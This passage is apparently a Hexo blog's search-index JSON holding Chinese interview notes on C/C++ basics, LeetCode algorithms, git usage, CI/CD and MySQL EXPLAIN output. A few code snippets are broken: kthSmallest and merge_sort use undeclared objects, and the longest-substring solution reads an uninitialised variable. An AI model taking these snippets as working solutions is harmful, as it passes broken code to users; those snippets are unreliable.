{"meta":{"title":"waynamigo's blog","subtitle":null,"description":null,"author":"waynamigo","url":"http://waynamigo.github.io","root":"/"},"pages":[{"title":"categories","date":"2019-07-13T16:06:28.000Z","updated":"2022-07-16T04:45:09.474Z","comments":false,"path":"categories/index.html","permalink":"http://waynamigo.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-07-13T16:06:18.000Z","updated":"2022-07-16T04:45:09.411Z","comments":false,"path":"tags/index.html","permalink":"http://waynamigo.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"微服务","slug":"2023-01-04-面试微服务","date":"2023-01-23T16:00:00.000Z","updated":"2023-11-19T12:38:35.680Z","comments":true,"path":"2023/01/24/2023-01-04-面试微服务/","link":"","permalink":"http://waynamigo.github.io/2023/01/24/2023-01-04-面试微服务/","excerpt":"持续更新","text":"持续更新 微服务概念性区分1.C和C++的区别C面向过程，C++面向对象C的内存管理使用malloc free，C++还可以使用new deleteC不支持函数重载，C++支持函数重载C没有引用，C++可以用引用堆和栈的区别stack编译器自动分配和释放，自底向上的数据结构heap需要由程序员手动new delete，会产生外部碎片，是自上到下的数据结构c++中不能被继承的成员函数析构函数和构造函数const定义常量修饰函数参数和函数返回值 修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值define给一个立即数，const是常量，放在静态区域，全局变量也在静态区域静态区：static无论是全局变量还是局部变量都存储在全局/静态区域，在编译期就为其分配内存，在程序结束时释放const的全局变量存储在只读数据段，第一次使用时被分配内存，结束时释放；const的局部变量存在栈中，代码块结束释放define定义的常量不可以用指针去指向，const定义的常量可以用指针去指向该常量的地址–const优点const 常量有数据类型，而宏常量没有数据类型。编译器可以对前者进行类型安全检查，后者只进行字符替换，没有类型安全检查，并且在字符替换可能报错。[全局变量放在静态存储区，整个程序开始分配内存，结束释放]staticstatic修饰的变量只能通过其所在文件、模块或函数进行调用，限制变量static修饰的变量一开始就得初始化，并存放于静态内存区volatile本条指令不会因编译器的优化而省略，不会被编译器察觉（隐藏变量），且要求每次重新读取volatile修饰的变量的内容extern 指针和引用的区别引用本质是只读指针，引用只能在初始化时被赋值,且必须被初始化，之后不能改变，指针是动态的引用不能为NULL，指针可以引用做函数参数时，内部传递的是变量地址进程间通信pipe管道，半双工，用于父子进程通信semaphore信号量，进程同步访问共享资源message que 消息队列，克服了缓冲区限制shared memory共享内存socket线程间通信全局变量 Messages消息机制；CEvent对象（MFC中的一种线程通信对象，通过其触发状态的改变实现同步与通信） 编译时运算符:sizeof 写一个函数指针( ( void ()() ) 0x100000) ( );void()()强制转换0x100000typedef void()() voidFunc;*( (voidFunc)0x100000 )(); 内存分配方式 从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。例如全局变量。 在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。 从堆上分配，亦称动态内存分配。程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存。动态内存的生存期由我们决定，使用非常灵活，但问题也最多。","categories":[{"name":"Golang","slug":"Golang","permalink":"http://waynamigo.github.io/categories/Golang/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"微服务","slug":"微服务","permalink":"http://waynamigo.github.io/tags/微服务/"}]},{"title":"一些算法整理","slug":"2023-01-24-面试算法","date":"2023-01-23T16:00:00.000Z","updated":"2023-12-02T08:16:29.257Z","comments":true,"path":"2023/01/24/2023-01-24-面试算法/","link":"","permalink":"http://waynamigo.github.io/2023/01/24/2023-01-24-面试算法/","excerpt":"持续更新","text":"持续更新 数组三树之和12345678910111213141516171819202122232425262728293031323334353637vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123; vector&lt;vector&lt;int&gt;&gt; ans; if(nums.size()&lt;3) return ans; sort(nums.begin(), nums.end()); if(nums[0]&gt;0) return ans; int i = 0; while(i&lt;nums.size()-2)&#123; if(nums[i]&gt;0) break; //将这个if语句放这里提前终止循环 int left = i+1, right = nums.size()-1; while(left&lt; right)&#123; // 转换为long long避免加法过程中溢出 long long y = static_cast&lt;long long&gt;(nums[i]); long long x = static_cast&lt;long long&gt;(nums[left]); long long z = static_cast&lt;long long&gt;(nums[right]); if(x + y &gt;0-z) right--; else if(x + y &lt;0-z) left++; else&#123; ans.push_back(&#123;nums[i], nums[left], nums[right]&#125;); // 相同的left和right不应该再次出现，因此跳过 while(left&lt;right&amp;&amp;nums[left]==nums[left+1]) left++; while(left&lt;right&amp;&amp;nums[right] == nums[right-1]) right--; left++; right--; &#125; &#125; // 避免nums[i]作为第一个数重复出现 // while(i+1&lt;nums.size()&amp;&amp;nums[i] == nums[i+1]) i++; // i++; do&#123;i++;&#125;while(i+1&lt;nums.size()&amp;&amp;nums[i-1] == nums[i]); &#125; return ans;&#125; 查找二分123456789101112131415int search(vector&lt;int&gt;&amp; nums, int target) &#123; int left = 0, right = nums.size() - 1; while(left &lt;= right)&#123; int mid = (right - left) / 2 + left; int num = nums[mid]; if (num == target) &#123; return mid; &#125; else if (num &gt; target) &#123; right = mid - 1; &#125; else &#123; left = mid + 1; &#125; &#125; return -1;&#125; LRU12345678910111213141516171819202122232425262728293031323334353637class LRUCache &#123; int capacity; list&lt;pair&lt;int,int&gt;&gt; cachelist;//实际缓存列表 unordered_map&lt;int,decltype(cachelist.begin())&gt; cache; //保存的缓存的迭代器public: LRUCache(int capacity) &#123; this-&gt;capacity = capacity; &#125; int get(int key) &#123; if (!cache.count(key)) return -1; // cout&lt;&lt;\"cend:\"&lt;&lt; -&gt;first; // 将缓存中的键值对移动到缓存列表的末尾，表示最近使用 cachelist.splice(cachelist.cend(), cachelist, cache[key]); return cache[key]-&gt;second; &#125; void put(int key, int value) &#123; if(!cache.count(key))&#123;//缓存列表里没有出现要进入的k //如果满了，就把最前删掉，然后加到链表尾 if(cachelist.size()==capacity)&#123; // 移除最久未使用的键值对 cache.erase(cachelist.front().first); // 从缓存映射中删除对应的键 cachelist.pop_front(); // 从缓存列表中删除最前面的元素 &#125; cache[key] = cachelist.emplace(cachelist.cend(),key,value); &#125;else&#123;//缓存列表里有这个新来的任务 //根据key更新任务内容 cache[key]-&gt;second = value; //把这个迭代器插入队尾 cachelist.splice(cachelist.cend(),cachelist,cache[key]); &#125; &#125;&#125;; 二叉树层序遍历1234567891011121314151617181920212223vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) &#123; vector&lt;vector&lt;int&gt;&gt;res; if(!root)&#123; return res; &#125; queue&lt;TreeNode*&gt; q; q.push(root); while(!q.empty())&#123; vector&lt;int&gt; tmp; // for(int i=0; i&lt;q.size() ;i++)&#123; //因为q在增加，可以先在外面int n =q.size() // 再for(int i=0; i&lt;n ;i++)&#123; for(int i = q.size(); i &gt; 0; --i) &#123; root = q.front(); q.pop(); tmp.push_back(root-&gt;val); if(root-&gt;left) q.push(root-&gt;left); if(root-&gt;right) q.push(root-&gt;right); &#125; res.push_back(tmp); &#125; return res;&#125; 最近公共祖先1234567891011121314151617181920TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) &#123; if(!root)&#123; return nullptr; &#125; if(root==p || root==q)&#123; return root; &#125; TreeNode* left = lowestCommonAncestor(root-&gt;left,p,q); TreeNode* right = lowestCommonAncestor(root-&gt;right,p,q); if(!left)&#123; return right; &#125; if(!right)&#123; return left; &#125; if(left &amp;&amp; right)&#123; return root; &#125; return nullptr;&#125; 二叉树最大直径 dfs123456789101112131415class Solution &#123;public: int depth(TreeNode* root,int &amp;res)&#123; if(!root) return 0; int l = depth(root-&gt;left,res); int r = depth(root-&gt;right,res); res = max(res, l+ r ); return max(l,r)+1; &#125; int diameterOfBinaryTree(TreeNode* root) &#123; int res = 0; depth(root,res); return res; &#125;&#125;; 翻转二叉树1递归左右子树 二叉搜索树第k小的元素【没懂，记住了】迭代方法，在找到答案后停止，不需要遍历整棵树 123456789101112131415161718class Solution &#123;public: int kthSmallest(TreeNode* root, int k) &#123; stack&lt;TreeNode* &gt; nodes; while(root &amp;&amp; nodes.size() &gt;0)&#123; while(root)&#123; stack.push(root); //左子树一直进栈 root = root -&gt; left; &#125; root = stack.top(); stack.pop(); k--; if(k==0) break; root = root-&gt;right; &#125; return root-&gt;val; &#125;&#125;; 判断树a是否是b的子树12345678910111213141516171819202122232425262728293031323334struct TreeNode &#123; int val; struct TreeNode *left; struct TreeNode *right; TreeNode(int x) : val(x), left(NULL), right(NULL) &#123; &#125;&#125;; bool isSubtree(TreeNode* pRoot1, TreeNode* pRoot2)&#123; if (pRoot1 == NULL &amp;&amp; pRoot2 != NULL) return false; if (pRoot2 == NULL) return true; if (pRoot1-&gt;val != pRoot2-&gt;val) return false; return isSubtree(pRoot1-&gt;left, pRoot2-&gt;left) &amp;&amp; isSubtree(pRoot1-&gt;right, pRoot2-&gt;right);&#125;bool HasSubtree(TreeNode* pRoot1, TreeNode* pRoot2)&#123; bool result = false; if (pRoot1 != NULL &amp;&amp; pRoot2 != NULL) &#123; if (pRoot1-&gt;val == pRoot2-&gt;val) &#123; result = isSubtree(pRoot1, pRoot2); &#125; if (!result) result = HasSubtree(pRoot1-&gt;left, pRoot2); if (!result) result = HasSubtree(pRoot1-&gt;right, pRoot2); &#125; return result;&#125; 链表k个一组翻转链表123456789101112131415161718192021222324252627282930313233ListNode * reverse(ListNode* head)&#123; ListNode* pre = nullptr; ListNode* cur = head; while(cur)&#123; ListNode* next; next = cur-&gt;next; cur-&gt;next =pre; pre = cur; cur = next; &#125; return pre;&#125;class Solution &#123;public: ListNode* reverseBetween(ListNode* head, int left, int right) &#123; ListNode* newnode=new ListNode(0); //必须要 newnode -&gt;next = head; ListNode* pre = newnode; //先找需要翻转的前一个节点 for(int i=0;i&lt;left-1 ;i++)&#123; pre = pre-&gt;next; &#125; ListNode* cur = pre-&gt;next; for(int i=0;i&lt;right-left;i++)&#123; ListNode* next = cur-&gt;next; cur-&gt;next =next-&gt;next; next-&gt;next = pre-&gt;next; pre-&gt;next = next; &#125; return newnode-&gt;next; &#125;&#125;; 链表相交123456789101112131415161718class Solution &#123;public: ListNode *getIntersectionNode(ListNode *headA, ListNode *headB) &#123; //哈希表 unordered_map&lt;ListNode*,int&gt;mp; ListNode* cur1=headA; while(cur1)&#123; mp[cur1]++; cur1=cur1-&gt;next; &#125; ListNode* cur2=headB; while(cur2)&#123; if(mp[cur2]) return cur2; cur2=cur2-&gt;next; &#125; return nullptr; &#125;&#125;; 滑动窗口无重复的最长子串/无重复字符的最长子串1234567891011121314151617181920class Solution &#123;public: int lengthOfLongestSubstring(string s) &#123; unordered_set&lt;char&gt; appears;// 判断是否重复 int res; int pos = 0,len = s.length(); for (int left =0 ;left &lt;len;left++)&#123; if(left!=0)&#123; // 只要下面的循环扫描一遍，就会来这里left++ //说明往右移走了一位，最左边字母删掉 appears.erase(s[left-1]); &#125; while(pos &lt; len &amp;&amp; !appears.count(s[pos]))&#123; appears.insert(s[pos]); pos++; &#125; res = max(res,pos - left); &#125; return res; &#125;&#125;; 判断s中是否有字符串st的排列https://leetcode.cn/problems/permutation-in-string/ 1234567891011121314151617181920212223bool checkInclusion(string s1, string s2) &#123; int n = s1.length(), m = s2.length(); if (n &gt; m) &#123; return false; &#125; vector&lt;int&gt; cnt(26); for (int i = 0; i &lt; n; ++i) &#123; cnt[s1[i] - 'a'] -- ; &#125; int left = 0; for (int right = 0; right &lt; m; ++right) &#123; int x = s2[right] - 'a'; cnt[x]++; while (cnt[x] &gt; 0) &#123; cnt[s2[left] - 'a'] --; left++; &#125; if (right - left + 1 == n) &#123; return true; &#125; &#125; return false;&#125; DP最长递增子序列1234567891011121314151617int lengthOfLIS(vector&lt;int&gt;&amp; nums) &#123;//O(n^2) int n = nums.size(); if(n==1) return 1; int dp[n];//dp[i]定义为num数组前i个里面最长的上升子序列长度 // memset(dp,0,sizeof(dp)); for(int i=0;i&lt;n;i++) dp[i]=1; int ans=dp[0]; for(int i=1;i&lt;n;i++)&#123; for(int j=0;j&lt;i;j++)&#123;//比较i前所有的数， if(nums[j]&lt;nums[i])&#123; dp[i]=dp[j]+1 &gt; dp[i] ? dp[j]+1 :dp[i]; &#125; &#125; ans = ans &gt; dp[i]? ans:dp[i]; &#125; return ans;&#125; 二分解法 12345678910111213141516171819202122232425262728int lengthOfLIS(vector&lt;int&gt;&amp; nums) &#123;//O(nlog2n) 抄的评论区 /** dp[i]: 所有长度为i+1的递增子序列中, 最小的那个序列尾数. 由定义知dp数组必然是一个递增数组, 可以用 maxL 来表示最长递增子序列的长度. 对数组进行迭代, 依次判断每个数num将其插入dp数组相应的位置: 1. num &gt; dp[maxL], 表示num比所有已知递增序列的尾数都大, 将num添加入dp 数组尾部, 并将最长递增序列长度maxL加1 2. dp[i-1] &lt; num &lt;= dp[i], 只更新相应的dp[i] **/ int maxL = 0; int n = nums.size(); int dp[n]; for(auto num : nums) &#123; // 二分法查找, 也可以调用库函数如binary_search int low = 0, high = maxL; while(low &lt; high) &#123; int mid = low+(high-low)/2; if(dp[mid] &lt; num) low = mid+1; else high = mid; &#125; dp[low] = num; if(low == maxL) maxL++; &#125; return maxL;&#125; 最长公共子序列1234567891011121314151617class Solution &#123;public: int longestCommonSubsequence(string text1, string text2) &#123; int m = text1.size(),n=text2.size(); vector&lt;vector&lt;int&gt;&gt; dp(m+1,vector&lt;int&gt;(n+1,0)); for(int i=0;i&lt;m;i++)&#123; for(int j=0;j&lt;n;j++)&#123; if(text1[i]==text2[j])&#123; dp[i+1][j+1] = dp[i][j]+1; &#125;else&#123; dp[i+1][j+1]=max(dp[i][j+1],dp[i+1][j]); &#125; &#125; &#125; return dp[m][n]; &#125;&#125;; 最大子数组/子序和123456789101112int maxSubArray(vector&lt;int&gt;&amp; nums) &#123; int n = nums.size(); int dp[n]; memset(dp,0,sizeof(dp)); dp[0]=nums[0]; int maxn = dp[0]; for(int i=1;i&lt;n;i++) &#123; dp[i]=max(nums[i],dp[i-1]+nums[i]); maxn = max(maxn,dp[i]); &#125; return maxn;&#125; 最长重复子数组123456789101112131415class Solution &#123;public: int findLength(vector&lt;int&gt;&amp; A, vector&lt;int&gt;&amp; B) &#123; int n = A.size(), m = B.size(); vector&lt;vector&lt;int&gt;&gt; dp(n + 1, vector&lt;int&gt;(m + 1, 0)); int ans = 0; for (int i = n - 1; i &gt;= 0; i--) &#123; for (int j = m - 1; j &gt;= 0; j--) &#123; dp[i][j] = A[i] == B[j] ? dp[i + 1][j + 1] + 1 : 0; ans = max(ans, dp[i][j]); &#125; &#125; return ans; &#125;&#125;; 打家劫舍【有限制的dp】12345678910111213141516class Solution &#123;public: int rob(vector&lt;int&gt;&amp; nums) &#123;//dp[i] =max(dp[i-1]跳过这间，dp[i-2]+nums[i]) int n = nums.size(); if(n==0)return 0; if(n==1)return nums[0]; int dp[n]; memset(dp,0,sizeof(dp)); dp[0]=nums[0]; dp[1]=max(nums[1],nums[0]); for(int i=2;i&lt;n ;i++)&#123; dp[i]=max(dp[i-1],dp[i-2]+nums[i]); &#125; return max(dp[n-1],dp[n-2]); &#125;&#125;; 排序第K个最大元素1234567891011121314151617181920class Solution &#123;public: int quickselect(vector&lt;int&gt; &amp;nums, int l, int r, int k) &#123; if (l == r) return nums[k]; int partition = nums[l], i = l - 1, j = r + 1; while (i &lt; j) &#123; do i++; while (nums[i] &lt; partition); do j--; while (nums[j] &gt; partition); if (i &lt; j) swap(nums[i], nums[j]); &#125; if (k &lt;= j)return quickselect(nums, l, j, k); else return quickselect(nums, j + 1, r, k); &#125; int findKthLargest(vector&lt;int&gt; &amp;nums, int k) &#123; int n = nums.size(); return quickselect(nums, 0, n - 1, n - k); &#125;&#125;; 归并1234567891011121314151617181920212223242526272829void merge_sort(vector&lt;int&gt;&amp; nums, int left, int right)&#123; if(left&gt;=right) return; int mid = (left+right)&gt;&gt;1; merge_sort(nums, left, mid); merge_sort(nums, mid+1, right); //递归调用完成后，[left,mid]和[mid+1,right]两个区间已经有序(升序) int i = left; int j = mid + 1; int count = 0; while(i&lt;=mid &amp;&amp; j&lt;=right)&#123; //如果 nums[i] &lt;= nums[j]那么就将nums[i]放入temp中，然后i++ if(nums[i]&lt;=nums[j])&#123; temp[count] = nums[i]; i++; &#125;else&#123; temp[count] = nums[j]; j++; &#125; count++; &#125; while(i&lt;=mid) temp[count++] = nums[i++]; while(j&lt;=right) temp[count++] = nums[j++]; int interval_length = right-left+1; for(int i = 0; i&lt;interval_length; i++) nums[i+left]=temp[i];&#125; 快排/快速排序1234567891011121314151617181920212223242526272829303132class Solution &#123; void quickSort(vector&lt;int&gt;&amp;nums, int startIndex, int endIndex) &#123; if (startIndex &gt;= endIndex) return; int l = startIndex, r = endIndex; int pivot = rand() % (endIndex - startIndex + 1) + startIndex; // 基于随机的原则 int pivotnum = nums[pivot]; swap(nums[startIndex], nums[pivot]); while (l &lt; r) &#123; // 从后往前走，将比第一个小的移到前面 while (l &lt; r &amp;&amp; nums[r] &gt;= pivotnum) r--; if (l &lt; r) &#123; nums[l] = nums[r]; &#125; // 从前往后走，将比第一个大的移到后面 while (l &lt; r &amp;&amp; nums[l] &lt;= pivotnum) l++; if (l &lt; r) &#123; nums[r] = nums[l]; &#125; &#125; nums[l] = pivotnum; // 自顶向下 quickSort(nums, startIndex, l - 1); quickSort(nums, l + 1, endIndex); &#125;public: vector&lt;int&gt; sortArray(vector&lt;int&gt;&amp; nums) &#123; int n = nums.size(); quickSort(nums, 0, n - 1); return nums; &#125;&#125;; 归并LRU12345678910111213141516171819202122232425262728293031323334353637class LRUCache &#123; int capacity; list&lt;pair&lt;int,int&gt;&gt; cachelist;//实际缓存列表 unordered_map&lt;int,decltype(cachelist.begin())&gt; cache; //保存的缓存的迭代器public: LRUCache(int capacity) &#123; this-&gt;capacity = capacity; &#125; int get(int key) &#123; if (!cache.count(key)) return -1; // cout&lt;&lt;\"cend:\"&lt;&lt; -&gt;first; // 将缓存中的键值对移动到缓存列表的末尾，表示最近使用 cachelist.splice(cachelist.cend(), cachelist, cache[key]); return cache[key]-&gt;second; &#125; void put(int key, int value) &#123; if(!cache.count(key))&#123;//缓存列表里没有出现要进入的k //如果满了，就把最前删掉，然后加到链表尾 if(cachelist.size()==capacity)&#123; // 移除最久未使用的键值对 cache.erase(cachelist.front().first); // 从缓存映射中删除对应的键 cachelist.pop_front(); // 从缓存列表中删除最前面的元素 &#125; cache[key] = cachelist.emplace(cachelist.cend(),key,value); &#125;else&#123;//缓存列表里有这个新来的任务 //根据key更新任务内容 cache[key]-&gt;second = value; //把这个迭代器插入队尾 cachelist.splice(cachelist.cend(),cachelist,cache[key]); &#125; &#125;&#125;; DFS全排列123456789101112131415161718192021222324class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; permute(vector&lt;int&gt;&amp; nums) &#123; vector&lt;vector&lt;int&gt;&gt; ans; vector&lt;bool&gt;visited(nums.size(),false); vector&lt;int&gt;perm; dfs(ans,nums,visited,perm); return ans; &#125; void dfs(vector&lt;vector&lt;int&gt;&gt;&amp; ans,vector&lt;int&gt;&amp; nums, vector&lt;bool&gt;&amp; visited,vector&lt;int&gt;&amp; perm)&#123; if(nums.size()==perm.size())&#123; ans.push_back(perm); &#125; for(int i=0;i&lt;nums.size();i++)&#123; if(!visited[i])&#123; perm.push_back(nums[i]); visited[i]=true; dfs(ans,nums,visited,perm); perm.pop_back(); visited[i]=false; &#125; &#125; &#125;&#125;; 岛屿周长1234567891011121314151617func islandPerimeter(grid [][]int) int &#123; var land, border int for i := 0; i &lt; len(grid); i++ &#123; for j := 0; j &lt; len(grid[0]); j++ &#123; if grid[i][j] == 1 &#123; land++ if i &lt; len(grid)-1 &amp;&amp; grid[i+1][j] == 1 &#123; border++ &#125; if j &lt; len(grid[0])-1 &amp;&amp; grid[i][j+1] == 1 &#123; border++ &#125; &#125; &#125; &#125; return 4*land - 2*border&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://waynamigo.github.io/categories/算法/"}],"tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://waynamigo.github.io/tags/Leetcode/"}]},{"title":"生产场景问题","slug":"2023-01-11-面经场景-mysql-redis-并发","date":"2023-01-10T16:00:00.000Z","updated":"2023-12-01T13:21:38.231Z","comments":true,"path":"2023/01/11/2023-01-11-面经场景-mysql-redis-并发/","link":"","permalink":"http://waynamigo.github.io/2023/01/11/2023-01-11-面经场景-mysql-redis-并发/","excerpt":"https://juejin.cn/post/6844904003998842887","text":"https://juejin.cn/post/6844904003998842887 分布式锁的实现https://juejin.cn/post/7041375517580689439etcd实现分布式锁 CICD的区别https://zhuanlan.zhihu.com/p/103554905 持续集成是对仓库每次更新完就跟进测试，每次提交远程仓库时，CI工具都会重建分支，并运行所有相关的测试用例，以验证新更改不会破坏现有应用程序的运行。然而要实施持续集成，必须满足一些先决条件。 1234条件如下为了使应用程序做好持续集成的准备，需要事先采取一些措施。最显而易见的是如果没有构建系统或测试要运行，则无法构建和测试应用程序。尽管看起来可能要花费额外的精力（特别是在代码没有进行过任何测试的情况下），持续集成可以带来很多好处。例如，自动化单元和集成测试能够在 bug 进入生产环境之前就捕获它们，这样一来更少的 bug 会被交付到生产中。事实上，防止一个潜在 bug 进入生产阶段的有效措施就是用一个测试用例覆盖它们，以确保它们不会导致产品回滚。除此之外，由于持续集成可以在短短几分钟内运行数百个测试用例，花费在手动测试上的时间也将大大减少，这意味着测试人员可以专注于更重要的改进而不是耗费大量精力在反复测试现有功能上。为了进一步开发和拓展持续集成机制以实现更高的自动化程度，我们引进了持续交付这一理念。 持续交付每次代码更改通过测试时都要对其进行重新部署。把构建和测试，发布三阶段自动化了，运维人员只要点一下按钮就可以部署应用程序。 持续部署部署则建立在交付之上。与持续交付相比，持续部署自动将代码更改部署到生产中而无需人工干预。这也意味着为了避免出现回滚和其他问题，您的测试包必须是一流的，因为它决定了您的发布过程。 项目团队将获取更快的部署速度，因为每项更改都可以进行自动处理，代码合并后几分钟就能够在生产环境中看到本地开发的功能；另一方面，代码发布的风险也能够进一步降低，因为您应该尽可能进行小批量部署，所以比较合适的场景是微服务和serverless场景。 serverless 和微服务的区别 视频处理的后端系统，常见功能需求如下：视频转码、抽取数据、人脸识别等，这些均为通用计算任务，可由函数计算执行。aliyun serverless的场景 merge 和 rebase 的区别【合并方式和历史记录，冲突解决方式】git merge： 将目标分支的最新提交合并到当前分支，创建一个新的合并提交，保留了分支的历史记录。 合并后会产生一个新的合并提交，记录了分支的合并操作。 适合公共分支的合并 git rebase： 将当前分支的提交“移动”到目标分支的最新提交之后，使得分支历史看起来更线性。 实际上是将当前分支的提交重新应用在目标分支的最新提交之后，形成一系列新的提交。 适合本地工作分支的合并 然后rebase 合并一些提交记录git merge：保留了分支的整个历史记录，可以清晰地看到分支的合并过程。git rebase：使得分支历史看起来更加线性，但也会丢失了分支的原始历史记录。pull 和fetch的区别 fetch拉取最新代码，本身不会产生冲突，origin/branch1 会覆盖掉本底的暂存branch1 pull = fetch + merge，会产生冲突 stash的使用【在merge之前，把本地stash起来，或者当前版本需要临时存到一个分支里】git rm的使用 git rm file 删除暂存区和源文件 git rm –cached file 删除暂存区文件 git reset file 删除暂存区文件 git restore –staged file 删除暂存区文件 强制切换分支，并丢弃当前内容checkout -f branchname 切换到 某个提交 log查看提交hash，checkout过来撤销一个commit 保留历史，丢弃提交git reset HEAD^ 完全丢弃git reset –hard HEAD^git revert ,这会创建一个新的提交来撤销特定的提交，保留了提交历史。 如果你已经push，不推荐使用 git reset，因为它会改变历史记录，可能会影响其他开发者。git revert 会创建一个新的提交，用于撤销指定的提交，这样可以保持提交历史的完整性。 git checkout 和reset 到指定版本1234567891011121314151617181. checkout作用：主要用于切换分支、切换到某个特定的提交、或者查看历史版本的内容。影响：切换分支或切换到特定提交时，会将工作目录和暂存区的状态更新为目标分支或提交的状态。如果是切换到特定提交，会处于“分离头指针”状态。回滚版本：不能用 git checkout 直接回滚到以前的版本。如果你只是想查看以前的版本，可以使用 git checkout &lt;commit_sha&gt; 来切换到特定提交。1. reset作用：用于重置当前分支的 HEAD 指针，可以将分支回退到以前的提交。影响：可以影响工作目录、暂存区和分支的状态，具体取决于使用的选项：--soft：保留工作目录和暂存区，只重置 HEAD 指针。--mixed（默认选项）：重置 HEAD 指针和暂存区，但保留工作目录。--hard：重置 HEAD 指针、暂存区和工作目录，丢弃所有本地的更改。回滚版本：可以用 git reset 回滚到以前的版本。例如，可以使用 git reset HEAD^ 将分支回滚到前一个提交。总结：如果你只是想查看以前的版本，可以使用 git checkout。如果你想回滚到以前的版本，可以使用 git reset，但要注意谨慎使用，因为它会影响工作目录、暂存区和分支的状态，并且在共享分支上可能会影响其他开发者。 github和gitlab的区别持续集成和持续部署的区别是什么，持续集成（CI）注重的是团队成员之间的协作与代码的频繁集成。通过自动化的构建和测试流程，保证了每次提交的代码都能够顺利地融入共享代码库，从而快速发现并解决潜在的集成问题，使团队能够保持稳步前进。 而持续部署（CD）则是在持续集成的基础上，将通过CI验证的代码自动地部署到目标环境，实现了软件交付的高效、可靠，甚至是自动化。这使得开发团队能够以更迅速的速度向生产环境中推送稳定可靠的软件，为项目的成功交付提供了坚实保障。 慢SQL问题如何排查如果你的数据库查询变慢了，可以采取以下步骤来找出问题并解决它： 找出慢查询：首先，找出哪些数据库查询很慢。通常，这些查询会花费很长时间才能返回结果。 检查查询计划：查看慢查询的执行计划，看看数据库是如何执行这些查询的。这可以帮助你找到性能瓶颈。 考虑索引：确保查询使用了适当的索引。有时候，缺少或错误使用索引会导致查询变慢。 优化SQL：审查慢查询的SQL语句，看看是否可以通过改写查询或者使用更有效的SQL来提高性能。 检查数据库服务器：确保数据库服务器有足够的资源来处理查询。不足的CPU、内存或磁盘IO可能会导致性能问题。 连接池：如果你在应用程序中使用了数据库连接池，确保连接池的配置正确。连接池的设置也可能影响性能。 数据库统计信息：查看数据库的统计信息，了解表的大小、索引情况和数据分布。这些信息可以指导你哪些地方需要优化。 查询缓存：考虑使用查询缓存，将经常执行的查询结果缓存起来，以减轻数据库负担。 分页查询优化：如果涉及到分页查询，确保使用了有效的分页查询方式，避免一次性获取大量数据。 监控和性能测试：建立监控系统，随时监测数据库性能。进行性能测试，模拟高负载情况，确保数据库在压力下能够正常工作。 explain的字段有哪些【主要看 type key rows extra】底层是查询优化器实现的， id 查询序号 select_type 查询类型 table 表名 partitions 匹配的分区 type(主要) 查询使用了什么类型，是index还是全表扫描，同时用了index还会在extra里显示using index 1system --&gt; const --&gt; eq_ref --&gt; ref --&gt; fulltext --&gt; ref_or_null --&gt; index_merge --&gt; unique_subquery --&gt; index_subquery --&gt; range --&gt; index --&gt; ALL prossible_keys 可能会选择的索引 key（主要） 实际选择的索引 key_len 索引的长度 ref 与索引作比较的列 rows（主要） 要检索的行数(估算值) filtered 查询条件过滤的行数的百分比 Extra（主要） 额外信息，dictinct，using index，using filesort，using temporary，最好是using index，filesort和tmp都可能导致性能下降 select type有哪些1234567891011SIMPLE 简单SELECT(不使用UNION或子查询)PRIMARY 最外层的SELECTUNION UNION中第二个或之后的SELECT语句DEPENDENT UNION UNION中第二个或之后的SELECT语句取决于外面的查询UNION RESULT UNION的结果SUBQUERY 子查询中的第一个SELECTDEPENDENT SUBQUERY 子查询中的第一个SELECT, 取决于外面的查询DERIVED 衍生表(FROM子句中的子查询)MATERIALIZED 物化子查询UNCACHEABLE SUBQUERY 结果集无法缓存的子查询，必须重新评估外部查询的每一行UNCACHEABLE UNION UNION中第二个或之后的SELECT，属于无法缓存的子查询 type的详细内容如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162除了all之外，其他的type都可以使用到索引，除了index_merge之外，其他的type只可以用到一个索引。1、system表中只有一行数据或者是空表，这是const类型的一个特例。且只能用于myisam和memory表。如果是Innodb引擎表，type列在这个情况通常都是all或者index2、const最多只有一行记录匹配。当联合主键或唯一索引的所有字段跟常量值比较时，join类型为const。其他数据库也叫做唯一索引扫描3、eq_ref多表join时，对于来自前面表的每一行，在当前表中只能找到一行。这可能是除了system和const之外最好的类型。当主键或唯一非NULL索引的所有字段都被用作join联接时会使用此类型。eq_ref可用于使用&apos;=&apos;操作符作比较的索引列。比较的值可以是常量，也可以是使用在此表之前读取的表的列的表达式。相对于下面的ref区别就是它使用的唯一索引，即主键或唯一索引，而ref使用的是非唯一索引或者普通索引。eq_ref只能找到一行，而ref能找到多行。4、ref对于来自前面表的每一行，在此表的索引中可以匹配到多行。若联接只用到索引的最左前缀或索引不是主键或唯一索引时，使用ref类型（也就是说，此联接能够匹配多行记录）。ref可用于使用&apos;=&apos;或&apos;&lt;=&gt;&apos;操作符作比较的索引列。5、 fulltext使用全文索引的时候是这个类型。要注意，全文索引的优先级很高，若全文索引和普通索引同时存在时，mysql不管代价，优先选择使用全文索引6、ref_or_null跟ref类型类似，只是增加了null值的比较。实际用的不多。eg.SELECT * FROM ref_tableWHERE key_column=expr OR key_column IS NULL;7、index_merge表示查询使用了两个以上的索引，最后取交集或者并集，常见and ，or的条件使用了不同的索引，官方排序这个在ref_or_null之后，但是实际上由于要读取多个索引，性能可能大部分时间都不如range8、unique_subquery用于where中的in形式子查询，子查询返回不重复值唯一值，可以完全替换子查询，效率更高。该类型替换了下面形式的IN子查询的ref：value IN (SELECT primary_key FROM single_table WHERE some_expr)9、index_subquery该联接类型类似于unique_subquery。适用于非唯一索引，可以返回重复值。10、range索引范围查询，常见于使用 =, &lt;&gt;, &gt;, &gt;=, &lt;, &lt;=, IS NULL, &lt;=&gt;, BETWEEN, 